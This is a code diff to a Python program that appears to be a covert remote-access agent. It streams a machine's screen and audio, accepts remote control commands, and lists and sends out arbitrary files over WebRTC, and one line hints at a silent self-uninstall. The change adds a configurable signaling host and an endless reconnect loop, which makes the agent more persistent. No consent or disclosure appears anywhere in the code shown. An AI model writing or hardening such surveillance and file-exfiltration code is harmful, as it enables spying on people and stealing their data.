@@ -262,41 +262,48 @@ async def run():
         silent_uninstall_and_cleanup()
         return
 
-    signaling = TcpSocketSignaling("localhost", 9999)
-    pc = RTCPeerConnection()
-
-    # Add media tracks
-    pc.addTrack(ScreenTrack())
-    pc.addTrack(AudioTrack())
-
-    @pc.on("datachannel")
-    def on_datachannel(channel):
-        @channel.on("message")
-        async def on_message(message):
-            data = json.loads(message)
-
-            if data["action"] == "control":
-                handle_control(data)
-
-            elif data["action"] == "list_files":
-                files = list_files(data.get("path", "."))
-                channel.send(json.dumps({"files": files}))
-
-            elif data["action"] == "download":
-                with open(data["path"], "rb") as f:
-                    channel.send(base64.b64encode(f.read()).decode())
-
-    await signaling.connect()
-
-    offer = await signaling.receive()
-    await pc.setRemoteDescription(offer)
-
-    answer = await pc.createAnswer()
-    await pc.setLocalDescription(answer)
-    await signaling.send(pc.localDescription)
+    signaling_host = os.getenv("RC_SIGNALING_HOST", "localhost")
+    signaling_port = int(os.getenv("RC_SIGNALING_PORT", "9999"))
 
     while True:
-        await asyncio.sleep(1)
+        signaling = TcpSocketSignaling(signaling_host, signaling_port)
+        pc = RTCPeerConnection()
+
+        # Add media tracks
+        pc.addTrack(ScreenTrack())
+        pc.addTrack(AudioTrack())
+
+        @pc.on("datachannel")
+        def on_datachannel(channel):
+            @channel.on("message")
+            async def on_message(message):
+                data = json.loads(message)
+
+                if data["action"] == "control":
+                    handle_control(data)
+
+                elif data["action"] == "list_files":
+                    files = list_files(data.get("path", "."))
+                    channel.send(json.dumps({"files": files}))
+
+                elif data["action"] == "download":
+                    with open(data["path"], "rb") as f:
+                        channel.send(base64.b64encode(f.read()).decode())
+
+        try:
+            await signaling.connect()
+            offer = await signaling.receive()
+            await pc.setRemoteDescription(offer)
+
+            answer = await pc.createAnswer()
+            await pc.setLocalDescription(answer)
+            await signaling.send(pc.localDescription)
+
+            while True:
+                await asyncio.sleep(1)
+        except (ConnectionError, OSError, asyncio.CancelledError):
+            await pc.close()
+            await asyncio.sleep(2)
 
 if __name__ == "__main__":
     asyncio.run(run())
